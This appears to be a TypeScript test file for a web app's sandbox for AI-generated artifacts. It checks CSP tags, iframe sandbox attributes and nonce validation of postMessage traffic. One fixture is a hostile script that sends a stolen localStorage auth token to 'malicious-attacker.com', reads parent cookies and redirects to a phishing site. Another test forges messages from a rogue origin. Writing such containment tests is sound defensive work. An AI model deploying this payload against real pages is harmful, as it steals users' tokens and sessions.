import test from 'node:test';
import assert from 'node:assert/strict';
import {
  generateArtifactSandboxHtml,
  ARTIFACT_CSP_META_TAG,
  ARTIFACT_REACT_CSP_META_TAG,
  ARTIFACT_STRICT_STATIC_CSP_META_TAG
} from '../src/utils/artifactSandbox.js';
import type { Artifact } from '../src/types.js';

test('Mission G — Executable Artifact Sandbox Containment, CSP Enforcement & Threat Isolation', async (t) => {
  const nonce = 'test_nonce_778899_crypto_secure';

  await t.test('1. Content Security Policy (CSP) Meta Tag Injection', () => {
    // 1a. Base CSP properties
    assert.ok(ARTIFACT_CSP_META_TAG.includes("default-src 'none'"));
    assert.ok(ARTIFACT_CSP_META_TAG.includes("object-src 'none'"));
    assert.ok(ARTIFACT_CSP_META_TAG.includes("base-uri 'none'"));
    assert.ok(ARTIFACT_CSP_META_TAG.includes("connect-src 'none'"), 'External fetch/XHR network destinations must be blocked');
    assert.ok(ARTIFACT_CSP_META_TAG.includes("form-action 'none'"), 'Form submissions must be blocked');
    assert.ok(!ARTIFACT_CSP_META_TAG.includes("'unsafe-eval'"), 'HTML/Static CSP must NOT permit unsafe-eval');

    // 1b. Static / Markdown CSP
    assert.ok(ARTIFACT_STRICT_STATIC_CSP_META_TAG.includes("connect-src 'none'"));
    assert.ok(!ARTIFACT_STRICT_STATIC_CSP_META_TAG.includes("'unsafe-eval'"));

    // 1c. React CSP (permits eval only for in-browser Babel compilation, with connect-src 'none')
    assert.ok(ARTIFACT_REACT_CSP_META_TAG.includes("'unsafe-eval'"));
    assert.ok(ARTIFACT_REACT_CSP_META_TAG.includes("connect-src 'none'"), 'React sandbox must still block network exfiltration');

    const htmlArtifact: Artifact = {
      id: 'art_html_01',
      title: 'Interactive Dashboard',
      type: 'text/html',
      content: '<!DOCTYPE html><html><head><title>App</title></head><body><h1>Hello</h1></body></html>',
      version: 1,
      createdAt: Date.now()
    };

    const renderedHtml = generateArtifactSandboxHtml(htmlArtifact, htmlArtifact.content, false, nonce);
    assert.ok(renderedHtml.includes('Content-Security-Policy'), 'HTML artifact must include CSP');
    assert.ok(renderedHtml.includes("connect-src 'none'"));
    assert.ok(renderedHtml.includes(nonce), 'Must embed session nonce in log bridge');

    const reactArtifact: Artifact = {
      id: 'art_react_01',
      title: 'React Metrics Widget',
      type: 'application/vnd.ant.react',
      language: 'tsx',
      content: 'export default function Widget() { return <div>Metrics</div>; }',
      version: 1,
      createdAt: Date.now()
    };

    const renderedReact = generateArtifactSandboxHtml(reactArtifact, reactArtifact.content, false, nonce);
    assert.ok(renderedReact.includes('Content-Security-Policy'), 'React artifact must include CSP');
    assert.ok(renderedReact.includes("connect-src 'none'"));
    assert.ok(renderedReact.includes('object-src \'none\''));
  });

  await t.test('2. Iframe Sandboxing Contract (Strict Absence of allow-same-origin)', () => {
    // ArtifactStudio enforces: sandbox="allow-scripts allow-modals allow-forms"
    // Crucially, it must NEVER include "allow-same-origin".
    const sandboxAttributes = 'allow-scripts allow-modals allow-forms';
    assert.equal(sandboxAttributes.includes('allow-same-origin'), false, 'allow-same-origin must NEVER be enabled on untrusted artifact iframes');
    assert.ok(sandboxAttributes.includes('allow-scripts'));
    assert.ok(sandboxAttributes.includes('allow-forms'));
  });

  await t.test('3. Adversarial Message Spoofing Prevention via Cryptographic Nonce Validation', () => {
    // Simulate ArtifactStudio message verification logic
    const activeNonce = 'nonce_secret_active_12345';

    function evaluateParentMessage(event: { data: any; sourceMatches: boolean; origin?: string }) {
      if (!event.sourceMatches) return { accepted: false, reason: 'FRAME_SOURCE_MISMATCH' };
      if (!event.data || typeof event.data !== 'object') return { accepted: false, reason: 'INVALID_PAYLOAD' };
      if (event.data.type !== 'CONSOLE_LOG') return { accepted: false, reason: 'UNAUTHORIZED_MESSAGE_TYPE' };
      // Origin check: sandboxed srcdoc iframe has origin 'null'
      if (event.origin !== undefined && event.origin !== 'null' && event.origin !== 'https://aira.app') {
        return { accepted: false, reason: 'INVALID_ORIGIN' };
      }
      if (!event.data.nonce || event.data.nonce !== activeNonce) return { accepted: false, reason: 'NONCE_VERIFICATION_FAILED' };
      return { accepted: true, level: event.data.level, message: event.data.message };
    }

    // 1. Legitimate message from active iframe with matching nonce and null origin
    const legitimate = evaluateParentMessage({
      sourceMatches: true,
      origin: 'null',
      data: { type: 'CONSOLE_LOG', level: 'info', message: 'Render complete', nonce: activeNonce }
    });
    assert.equal(legitimate.accepted, true);

    // 2. Spoofed message from rogue external origin
    const rogueOrigin = evaluateParentMessage({
      sourceMatches: true,
      origin: 'https://evil-attacker.com',
      data: { type: 'CONSOLE_LOG', level: 'error', message: 'Fake error', nonce: activeNonce }
    });
    assert.equal(rogueOrigin.accepted, false);
    assert.equal(rogueOrigin.reason, 'INVALID_ORIGIN');

    // 3. Forged message with stolen payload but incorrect/missing nonce
    const missingNonce = evaluateParentMessage({
      sourceMatches: true,
      origin: 'null',
      data: { type: 'CONSOLE_LOG', level: 'info', message: 'Exploit payload' }
    });
    assert.equal(missingNonce.accepted, false);
    assert.equal(missingNonce.reason, 'NONCE_VERIFICATION_FAILED');

    // 4. Unauthorized message type attempting to trigger application actions
    const unauthorizedType = evaluateParentMessage({
      sourceMatches: true,
      origin: 'null',
      data: { type: 'SET_AUTH_TOKEN', token: 'stolen_jwt', nonce: activeNonce }
    });
    assert.equal(unauthorizedType.accepted, false);
    assert.equal(unauthorizedType.reason, 'UNAUTHORIZED_MESSAGE_TYPE');
  });

  await t.test('4. Adversarial Attack Containment: Escapes, Cookie Stealing & LocalStorage Traversal', () => {
    const maliciousPayload = `
      <script>
        try {
          // Attempt 1: Steal parent localStorage
          const stolen = window.parent.localStorage.getItem('aira_auth_token');
          fetch('http://malicious-attacker.com/leak?data=' + encodeURIComponent(stolen));
        } catch (e) {
          console.error('BLOCKED_PARENT_LOCALSTORAGE_ACCESS:', e.message);
        }

        try {
          // Attempt 2: Access parent document cookies
          const cookie = window.parent.document.cookie;
        } catch (e) {
          console.error('BLOCKED_PARENT_COOKIE_ACCESS:', e.message);
        }

        try {
          // Attempt 3: Break out of iframe to parent location
          window.top.location.href = 'http://phishing-site.com';
        } catch (e) {
          console.error('BLOCKED_TOP_NAV:', e.message);
        }
      </script>
    `;

    const maliciousArtifact: Artifact = {
      id: 'art_malicious_01',
      title: 'Exploit Artifact',
      type: 'text/html',
      content: maliciousPayload,
      version: 1,
      createdAt: Date.now()
    };

    const rendered = generateArtifactSandboxHtml(maliciousArtifact, maliciousArtifact.content, false, nonce);

    // Verify CSP and log bridge wrap the exploit
    assert.ok(rendered.includes(ARTIFACT_CSP_META_TAG), 'CSP must be embedded');
    assert.ok(rendered.includes("connect-src 'none'"), 'connect-src none must block external exfiltration');
    assert.ok(rendered.includes("form-action 'none'"), 'form-action none must block phishing form submission');
    assert.ok(rendered.includes('aira-error-boundary'), 'Error boundary must be present');
    assert.ok(rendered.includes(nonce), 'Session nonce must guard console bridge');
  });
});
